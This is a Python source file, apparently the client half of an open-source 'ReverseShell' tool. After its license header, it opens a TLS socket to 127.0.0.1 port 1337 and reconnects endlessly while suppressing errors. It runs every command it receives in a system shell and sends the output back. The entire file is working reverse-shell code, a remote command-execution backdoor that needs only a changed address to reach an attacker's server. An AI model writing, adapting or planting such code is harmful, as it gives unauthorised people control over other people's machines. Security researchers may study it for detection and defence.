#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This package implements an advanced reverse shell console.
#    Copyright (C) 2023  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This package implements an advanced reverse shell
console (supports: TCP, UDP, IRC, HTTP and DNS).
"""

__version__ = "0.0.1"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This package implements an advanced reverse shell
console (supports: TCP, UDP, IRC, HTTP and DNS).
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/ReverseShell"

copyright = """
ReverseShell  Copyright (C) 2023  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = []

print(copyright)

from os.path import join
from socket import socket
from contextlib import suppress
from subprocess import run, PIPE
from ssl import SSLContext, PROTOCOL_TLS_CLIENT

context = SSLContext(PROTOCOL_TLS_CLIENT)
context.load_verify_locations(join('..', 'server.crt'))

def sendall(data):
    chunk = data[:30000]
    data = data[30000:]
    while chunk:
        ss.sendall(chunk)
        chunk = data[:30000]
        data = data[30000:]


while True:
    with suppress(Exception):
        s = socket()
        ss = context.wrap_socket(s, server_hostname='localhost')
        ss.connect(("127.0.0.1", 1337))
        data = b" "
        while True:
            sendall(data)
            data = ss.recv(65535).decode()
            p = run(data, shell=True, stdout=PIPE, stderr=PIPE)
            data = p.stdout or p.stderr or b" "
        ss.close()
        s.close()
